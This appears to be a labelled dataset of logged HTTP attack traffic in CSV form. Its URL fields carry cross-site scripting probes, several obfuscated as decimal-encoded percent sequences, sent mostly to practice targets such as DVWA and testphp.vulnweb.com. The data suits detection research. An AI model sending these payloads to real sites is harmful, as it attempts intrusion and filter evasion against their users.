timestamp,session_id,src_ip,src_port,dst_ip,host,url,user_agent,response_size,status_code,status_message,unknown10,attack
1556343324,Cv5OAC4zblpB5t5rw2,192.168.1.32,39298,192.168.1.190,192.168.1.190,"/webmail/src/login.php37,51,99,37,54,102,37,54,50,37,54,97,37,54,53,37,54,51,37,55,52,37,50,48,37,55,51,37,55,50,37,54,51,37,51,100,37,51,49,37,50,48,37,54,56,37,55,50,37,54,53,37,54,54,37,51,100,37,51,49,37,50,48,37,54,102,37,54,101,37,54,53,37,55,50,37,55,50,37,54,102,37,55,50,37,51,100,37,50,50,37,54,97,37,54,49,37,55,54,37,54,49,37,55,51,37,54,51,37,55,50,37,54,57,37,55,48,37,55,52,37,51,97,37,54,54,37,51,55,37,54,51,37,54,50,37,51,49,37,51,55,37,51,52,37,54,53,37,51,55,37,51,52,37,54,50,37,54,49,37,51,51,37,54,49,37,51,55,37,54,50,37,51,51,37,51,56,37,54,53,37,54,52,37,54,49,37,51,52,37,51,53,37,51,57,37,54,52,37,54,52,37,54,52,37,51,48,37,51,55,37,51,52,37,54,53,37,54,50,37,50,50,37,51,101,37,51,99,37,50,102,37,54,102,37,54,50,37,54,97,37,54,53,37,54,51,37,55,52,37,51,101",hacking,1075,403,Forbidden,FxkRb2vcjXj49eLb7,1
1556341706,COgLQ140FaIzlS7yM4,192.168.1.36,43884,192.168.1.195,192.168.1.195,/dvwa/vulnerabilities/sqli//<<SCRIPT>88d6d66aaef93a33ba543721257e4598//<</SCRIPT>,myibrow/2.2 (Windows; U; Windows NT 5.1; cs; rv:1.8.1.14) Gecko/20080001 My Internet Browser/2.2.0.0 20080913235045,527,403,Forbidden,F09Fz2mUeZn9CZr9h,1
1556343691,CP7ha54sa9pO0Uu2x4,192.168.1.32,57408,192.168.1.195,192.168.1.195,/dvwa/vulnerabilities/sqli//<SCRIPT FOR=document EVENT=onreadystatechange>javascript:d3c99d3dcf7eefd6fc29610463be68ea</SCRIPT>,"Mozilla/5.0 (Linux; U; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.27 Safari/525.13",980,400,Bad Request,FntqEe4jaYaEBNlJIb,1
1556341761,CGOK4w3KMtqMov2wnh,192.168.1.36,50044,192.168.1.152,192.168.1.152,"/<svg xmlns=""http://www.w3.org/2000/svg""> <set attributeName=""onmouseover"" to=""eb870962cad1f8e6f74f9017d73a7b65""/> <animate attributeName=""onunload"" to=""eb870962cad1f8e6f74f9017d73a7b65""/> </svg>",Mozilla/1.22 (compatible; MSIE 10.0; Windows 3.1),0,403,Forbidden,FF5Ape4JlYiYQVoJz6,1
1556342691,CYoQh72YajIrEHha09,192.168.1.36,48040,176.28.50.165,testphp.vulnweb.com,/http://www.google<script .com>alert(cfffe398e86ef179b5d322cea81fe342)</script,Mozilla/5.0 (compatible; Konqueror/4.5; FreeBSD) KHTML/4.5.4 (like Gecko),168,404,Not Found,FljxiskF1iQ6AcXPi,1
1556341425,Cwd8TN2BMOd5knBWT1,192.168.1.32,36208,176.28.50.165,testphp.vulnweb.com,"/37,51,99,37,52,50,37,53,50,37,50,48,37,53,51,37,52,57,37,53,97,37,52,53,37,51,100,37,50,50,37,50,54,37,55,98,37,54,50,37,51,51,37,51,56,37,51,50,37,51,51,37,51,48,37,51,51,37,54,54,37,51,49,37,54,54,37,51,51,37,54,50,37,51,53,37,51,50,37,51,57,37,51,53,37,51,55,37,51,56,37,51,52,37,51,56,37,51,50,37,51,51,37,51,50,37,51,50,37,51,53,37,51,52,37,51,56,37,54,50,37,54,50,37,51,56,37,51,50,37,54,50,37,55,100,37,50,50,37,51,101",hacking,168,404,Not Found,F7vpLp1C5k07S5rPl4,1
1556342381,CdrhV23469j485JkKl,192.168.1.32,47282,176.28.50.165,testphp.vulnweb.com,"/37,51,99,37,54,57,37,54,54,37,55,50,37,54,49,37,54,100,37,54,53,37,50,48,37,55,51,37,55,52,37,55,57,37,54,99,37,54,53,37,51,100,37,50,50,37,55,48,37,54,102,37,55,51,37,54,57,37,55,52,37,54,57,37,54,102,37,54,101,37,51,97,37,54,49,37,54,50,37,55,51,37,54,102,37,54,99,37,55,53,37,55,52,37,54,53,37,51,98,37,55,52,37,54,102,37,55,48,37,51,97,37,51,48,37,51,98,37,54,99,37,54,53,37,54,54,37,55,52,37,51,97,37,51,48,37,51,98,37,55,55,37,54,57,37,54,52,37,55,52,37,54,56,37,51,97,37,51,49,37,51,48,37,51,48,37,50,53,37,51,98,37,54,56,37,54,53,37,54,57,37,54,55,37,54,56,37,55,52,37,51,97,37,51,49,37,51,48,37,51,48,37,50,53,37,50,50,37,50,48,37,54,102,37,54,101,37,54,100,37,54,102,37,55,53,37,55,51,37,54,53,37,54,102,37,55,54,37,54,53,37,55,50,37,51,100,37,50,50,37,55,48,37,55,50,37,54,102,37,54,100,37,55,48,37,55,52,37,50,56,37,51,53,37,51,51,37,54,49,37,51,57,37,54,51,37,51,51,37,51,49,37,51,51,37,51,53,37,51,49,37,51,57,37,54,53,37,51,54,37,51,54,37,54,53,37,51,50,37,54,52,37,51,52,37,54,54,37,54,51,37,54,49,37,54,52,37,54,54,37,51,54,37,54,51,37,54,53,37,54,50,37,51,50,37,51,49,37,51,51,37,51,48,37,51,53,37,50,57,37,50,50,37,51,101",hacking,168,404,Not Found,FBtcmI3Pk2AnD6Savf,1
1556343335,CLjB2r48q5s4oFjRRc,192.168.1.36,34002,18.194.169.124,www.mqtt-dashboard.com,"/37,54,49,37,51,100,37,50,50,37,54,55,37,54,53,37,55,52,37,50,50,37,51,98,37,54,50,37,51,100,37,50,50,37,53,53,37,53,50,37,52,99,37,50,56,37,50,50,37,50,50,37,51,98,37,54,51,37,51,100,37,50,50,37,54,97,37,54,49,37,55,54,37,54,49,37,55,51,37,54,51,37,55,50,37,54,57,37,55,48,37,55,52,37,51,97,37,50,50,37,51,98,37,54,52,37,51,100,37,50,50,37,51,56,37,51,57,37,51,51,37,51,53,37,51,56,37,51,50,37,54,53,37,51,51,37,51,52,37,51,55,37,51,50,37,54,51,37,51,52,37,51,54,37,54,49,37,51,49,37,51,52,37,51,54,37,51,52,37,51,54,37,51,57,37,51,51,37,51,53,37,54,54,37,51,49,37,51,52,37,51,49,37,51,49,37,54,49,37,51,57,37,51,49,37,51,48,37,50,50,37,50,57,37,50,50,37,51,98,37,54,53,37,55,54,37,54,49,37,54,99,37,50,56,37,54,49,37,50,98,37,54,50,37,50,98,37,54,51,37,50,98,37,54,52,37,50,57,37,51,98",hacking,995,403,Forbidden,F5q0CiZfmWWjprW44,1
1556343585,CBhP2ZcZsRCEdXHo,192.168.1.32,49476,192.168.1.152,192.168.1.152,/<body onscroll=678d27ea37b8840ec3ce3f9e34af3708><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><input autofocus>,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",301,400,Bad Request,FCrNQY1D5jBoY0Wtaj,1
1556342833,ConMax3oRnkBr1FfAg,192.168.1.36,54270,176.28.50.165,testphp.vulnweb.com,"/37,51,99,37,54,100,37,54,49,37,55,50,37,55,49,37,55,53,37,54,53,37,54,53,37,50,48,37,54,102,37,54,101,37,55,51,37,55,52,37,54,49,37,55,50,37,55,52,37,51,100,37,50,55,37,54,97,37,54,49,37,55,54,37,54,49,37,55,51,37,54,51,37,55,50,37,54,57,37,55,48,37,55,52,37,51,97,37,54,49,37,54,99,37,54,53,37,55,50,37,55,52,37,50,54,37,50,51,37,55,56,37,51,50,37,51,56,37,51,98,37,51,52,37,51,48,37,51,52,37,51,54,37,54,53,37,51,53,37,54,52,37,51,57,37,54,51,37,51,50,37,51,53,37,51,53,37,51,56,37,51,55,37,51,57,37,51,52,37,51,49,37,54,50,37,51,49,37,51,52,37,51,51,37,51,53,37,51,52,37,51,56,37,51,51,37,51,57,37,51,57,37,51,48,37,51,52,37,54,52,37,51,53,37,51,48,37,50,54,37,50,51,37,55,56,37,51,50,37,51,57,37,51,98,37,50,55,37,51,101,37,53,101,37,53,102,37,53,102,37,53,101",hacking,168,404,Not Found,FnCuFU2OZSAGsV9bX8,1
